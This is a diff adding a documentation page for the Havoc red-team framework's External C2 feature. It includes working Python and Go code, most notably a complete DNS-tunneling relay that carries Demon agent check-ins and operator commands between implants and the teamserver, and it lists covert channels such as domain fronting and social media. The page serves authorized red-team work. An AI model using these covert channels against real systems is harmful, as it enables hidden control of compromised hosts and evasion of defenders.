@@ -1,0 +1,471 @@
+---
+title: External C2
+description: Integrate custom command and control channels using Havoc's External C2 system
+---
+
+External C2 allows you to route Demon agent traffic through custom transport channels while the Teamserver handles agent parsing and command dispatching.
+
+## Overview
+
+Havoc's External C2 implementation separates transport from command logic:
+
+- **Your Responsibility**: Implement custom transport (DNS, ICMP, cloud APIs, etc.)
+- **Teamserver's Role**: Parse agent packets, dispatch commands, manage sessions
+
+This architecture enables:
+
+<CardGroup cols={2}>
+  <Card title="Custom Protocols" icon="network-wired">
+    DNS, ICMP, custom binary protocols
+  </Card>
+  <Card title="Cloud Services" icon="cloud">
+    AWS SQS, Azure Service Bus, GCP Pub/Sub
+  </Card>
+  <Card title="Domain Fronting" icon="mask">
+    CDN-based traffic redirection
+  </Card>
+  <Card title="Covert Channels" icon="eye-slash">
+    Social media, file sharing, IoT protocols
+  </Card>
+</CardGroup>
+
+## Architecture
+
+```
+┌──────────────┐         ┌──────────────┐         ┌──────────────┐
+│    Demon     │────────▶│   Your ExC2  │────────▶│  Teamserver  │
+│    Agent     │  Custom │   Transport  │ Service │   /external  │
+│              │◀────────│   Layer      │◀────────│   Endpoint   │
+└──────────────┘Protocol └──────────────┘   API   └──────────────┘
+```
+
+1. Demon agent sends encrypted packet
+2. Your transport receives and forwards to Teamserver external endpoint
+3. Teamserver parses packet, processes command
+4. Response flows back through your transport
+5. Agent receives and decrypts response
+
+## Configuration
+
+### Teamserver Profile
+
+Enable the Service API in your profile:
+
+```hcl profiles/havoc.yaotl
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 40056
+}
+
+Service {
+    Endpoint = "service-endpoint"
+    Password = "service-password"
+}
+```
+
+<Note>
+  The `Service` directive creates a WebSocket endpoint at `ws://<host>:<port>/<endpoint>` for External C2 communication.
+</Note>
+
+### Starting the Teamserver
+
+```bash
+sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug
+```
+
+You'll see output confirming the Service endpoint is available:
+
+```
+[*] Service endpoint listening on /service-endpoint
+```
+
+## Implementation
+
+### Service API Connection
+
+Connect to the Teamserver using the Service API:
+
+<Tabs>
+  <Tab title="Python">
+    ```python externalc2.py
+    from havoc.service import HavocService
+    import asyncio
+
+    class ExternalC2:
+        def __init__(self):
+            self.havoc = HavocService(
+                endpoint="ws://0.0.0.0:40056/service-endpoint",
+                password="service-password"
+            )
+
+        async def start(self):
+            # Register External C2 listener
+            await self.havoc.register_externalc2(
+                name="DNS-C2",
+                endpoint="dns-transport"
+            )
+
+            # Start your transport listener
+            await self.listen_dns()
+
+        async def listen_dns(self):
+            # Your custom DNS server logic
+            pass
+
+    if __name__ == "__main__":
+        exc2 = ExternalC2()
+        asyncio.run(exc2.start())
+    ```
+  </Tab>
+
+  <Tab title="Go">
+    ```go main.go
+    package main
+
+    import (
+        "github.com/gorilla/websocket"
+        "encoding/json"
+        "log"
+    )
+
+    type ServiceClient struct {
+        conn *websocket.Conn
+    }
+
+    func (s *ServiceClient) Connect(endpoint, password string) error {
+        conn, _, err := websocket.DefaultDialer.Dial(endpoint, nil)
+        if err != nil {
+            return err
+        }
+        s.conn = conn
+
+        // Authenticate
+        authMsg := map[string]interface{}{
+            "Head": map[string]string{"Type": "Register"},
+            "Body": map[string]string{"Password": password},
+        }
+        return s.conn.WriteJSON(authMsg)
+    }
+
+    func main() {
+        client := &ServiceClient{}
+        err := client.Connect(
+            "ws://0.0.0.0:40056/service-endpoint",
+            "service-password",
+        )
+        if err != nil {
+            log.Fatal(err)
+        }
+        defer client.conn.Close()
+
+        // Register ExternalC2 and start transport
+    }
+    ```
+  </Tab>
+</Tabs>
+
+### Registering External C2 Listener
+
+Send a `ListenerAddExC2` message to register your external listener:
+
+```python
+import json
+
+def register_externalc2(websocket, name, endpoint):
+    message = {
+        "Head": {
+            "Type": "Listener",
+            "RequestID": "req-12345"  # Unique request ID
+        },
+        "Body": {
+            "Type": "ListenerAddExC2",
+            "Name": name,
+            "Endpoint": endpoint
+        }
+    }
+    websocket.send(json.dumps(message))
+
+    # Wait for confirmation
+    response = json.loads(websocket.recv())
+    if response["Body"]["ExC2"]["Success"]:
+        print(f"ExternalC2 '{name}' registered successfully")
+    else:
+        print(f"Error: {response['Body']['ExC2']['Error']}")
+```
+
+The Teamserver creates an endpoint at:
+```
+http://<teamserver>:<port>/<endpoint>
+```
+
+### Forwarding Agent Traffic
+
+When you receive agent data through your transport:
+
+<Steps>
+  <Step title="Receive from Transport">
+    ```python
+    # Example: DNS query with base64-encoded agent data
+    dns_query = "aGVsbG8gd29ybGQ="  # Your custom protocol
+    agent_data = base64.b64decode(dns_query)
+    ```
+  </Step>
+
+  <Step title="Forward to Teamserver">
+    ```python
+    import requests
+    import base64
+
+    def forward_to_teamserver(agent_data, endpoint):
+        url = f"http://0.0.0.0:40056/{endpoint}"
+        response = requests.post(url, data=agent_data)
+        return response.content  # Teamserver response
+    ```
+  </Step>
+
+  <Step title="Return Response via Transport">
+    ```python
+    # Send Teamserver response back through your transport
+    response_data = forward_to_teamserver(agent_data, "dns-transport")
+    
+    # Example: Encode as DNS TXT record
+    dns_response = base64.b64encode(response_data).decode()
+    send_dns_response(dns_response)
+    ```
+  </Step>
+</Steps>
+
+## Teamserver Endpoint Handling
+
+The External C2 endpoint handles agent packets identically to HTTP listeners:
+
+```go teamserver/pkg/handlers/external.go
+func (e *External) Request(ctx *gin.Context) {
+    // Read agent packet from request body
+    Body, err := io.ReadAll(ctx.Request.Body)
+    if err != nil {
+        logger.Debug("Error reading request: " + err.Error())
+    }
+
+    ExternalIP := strings.Split(ctx.Request.RemoteAddr, ":")[0]
+
+    // Parse agent packet and generate response
+    if Response, Success := parseAgentRequest(e.Teamserver, Body, ExternalIP); Success {
+        ctx.Writer.Write(Response.Bytes())
+    } else {
+        ctx.AbortWithStatus(http.StatusNotFound)
+    }
+}
+```
+
+<Accordion title="View parseAgentRequest Logic">
+  The `parseAgentRequest` function:
+  1. Decrypts the agent packet
+  2. Parses the Demon protocol
+  3. Processes commands
+  4. Generates encrypted response
+  5. Returns response bytes
+
+  This is the same logic used by HTTP/HTTPS listeners.
+</Accordion>
+
+## Complete Example: DNS ExternalC2
+
+<CodeGroup>
+```python dns_externalc2.py
+import asyncio
+import base64
+from dnslib.server import DNSServer, BaseResolver
+from dnslib import RR, QTYPE, A, TXT
+import requests
+from havoc.service import HavocService
+
+class HavocDNSResolver(BaseResolver):
+    def __init__(self, teamserver_url):
+        self.teamserver_url = teamserver_url
+
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = str(request.q.qname)
+
+        # Extract agent data from subdomain
+        if qname.startswith("agent."):
+            encoded_data = qname.split(".")[1]
+            try:
+                agent_data = base64.b64decode(encoded_data)
+                
+                # Forward to Teamserver ExternalC2 endpoint
+                response = requests.post(
+                    self.teamserver_url,
+                    data=agent_data,
+                    timeout=5
+                )
+                
+                # Return response as TXT record
+                response_b64 = base64.b64encode(response.content).decode()
+                reply.add_answer(
+                    RR(qname, QTYPE.TXT, rdata=TXT(response_b64), ttl=0)
+                )
+            except Exception as e:
+                print(f"Error processing request: {e}")
+                reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1")))
+        else:
+            # Default response
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1")))
+
+        return reply
+
+async def main():
+    # Connect to Havoc Service API
+    havoc = HavocService(
+        endpoint="ws://0.0.0.0:40056/service-endpoint",
+        password="service-password"
+    )
+
+    # Register ExternalC2
+    await havoc.register_externalc2(
+        name="DNS-ExternalC2",
+        endpoint="dns-exc2"
+    )
+
+    # Start DNS server
+    resolver = HavocDNSResolver("http://0.0.0.0:40056/dns-exc2")
+    dns_server = DNSServer(resolver, port=53, address="0.0.0.0")
+    
+    print("[+] DNS ExternalC2 listening on 0.0.0.0:53")
+    dns_server.start_thread()
+
+    # Keep alive
+    while True:
+        await asyncio.sleep(1)
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
+
+```python requirements.txt
+requests
+dnslib
+havoc-py
+```
+</CodeGroup>
+
+## Protocol Flow
+
+<Accordion title="Initial Agent Registration">
+  ```
+  1. Agent → Custom Transport: Encrypted registration packet
+  2. Transport → Teamserver /external: HTTP POST with packet
+  3. Teamserver: Decrypts, parses, creates session
+  4. Teamserver → Transport: Encrypted response
+  5. Transport → Agent: Response via custom protocol
+  6. Agent appears in Havoc UI
+  ```
+</Accordion>
+
+<Accordion title="Command Execution">
+  ```
+  1. Operator → Havoc UI: Issues command
+  2. Teamserver: Queues command for agent
+  3. Agent → Transport: Check-in via custom protocol
+  4. Transport → Teamserver /external: Forwarded check-in
+  5. Teamserver → Transport: Encrypted command packet
+  6. Transport → Agent: Command via custom protocol
+  7. Agent executes and sends output
+  8. Cycle repeats for output transmission
+  ```
+</Accordion>
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="Error Handling">
+    - Always validate data before forwarding to Teamserver
+    - Handle Teamserver connection failures gracefully
+    - Implement retry logic for transient failures
+    - Log errors for debugging without exposing sensitive data
+  </Accordion>
+
+  <Accordion title="Performance">
+    - Use connection pooling for HTTP requests
+    - Implement caching for repeated requests
+    - Consider async/await for I/O operations
+    - Monitor latency between transport and Teamserver
+  </Accordion>
+
+  <Accordion title="Security">
+    - Validate and sanitize all input data
+    - Use TLS for Teamserver connections in production
+    - Implement rate limiting to prevent abuse
+    - Don't log decrypted agent data
+  </Accordion>
+
+  <Accordion title="Testing">
+    - Test with Demon agent in controlled environment
+    - Verify packet forwarding with Wireshark/tcpdump
+    - Monitor Teamserver logs for parsing errors
+    - Use `--debug` flag during development
+  </Accordion>
+</AccordionGroup>
+
+## Debugging
+
+<Steps>
+  <Step title="Enable Debug Output">
+    ```bash
+    sudo ./havoc server --profile ./profiles/havoc.yaotl --debug
+    ```
+  </Step>
+
+  <Step title="Monitor Service Connection">
+    ```
+    [DEBUG] Service client authenticated
+    [INFO] [SERVICE] registered a new listener [Name: DNS-ExternalC2]
+    ```
+  </Step>
+
+  <Step title="Check External Endpoint">
+    ```
+    [DEBUG] ExternalC2 [DNS-ExternalC2] client connected
+    [DEBUG]  - Exc2 Host : 127.0.0.1:40056
+    [DEBUG]  - Exc2 Body : [hex dump of agent packet]
+    ```
+  </Step>
+</Steps>
+
+## Limitations
+
+<Warning>
+  - One agent packet per request (Demon protocol limitation)
+  - Must preserve packet integrity (no fragmentation)
+  - Teamserver expects standard Demon packet format
+  - External endpoint is HTTP only (TLS termination at your layer)
+</Warning>
+
+## Example Use Cases
+
+<CardGroup cols={2}>
+  <Card title="DNS Tunneling" icon="network-wired">
+    Route traffic through DNS queries (A, TXT, CNAME records)
+  </Card>
+  <Card title="Cloud Queues" icon="cloud">
+    Use AWS SQS, Azure Storage Queues for async C2
+  </Card>
+  <Card title="Webhooks" icon="webhook">
+    Integrate with Slack, Discord, Microsoft Teams
+  </Card>
+  <Card title="IoT Protocols" icon="microchip">
+    MQTT, CoAP for IoT-based infrastructure
+  </Card>
+</CardGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Service API Reference" href="/extensibility/python-api">
+    Complete Python API documentation
+  </Card>
+  <Card title="Custom Agents" href="/extensibility/custom-agents">
+    Build agents that work with External C2
+  </Card>
+</CardGroup>
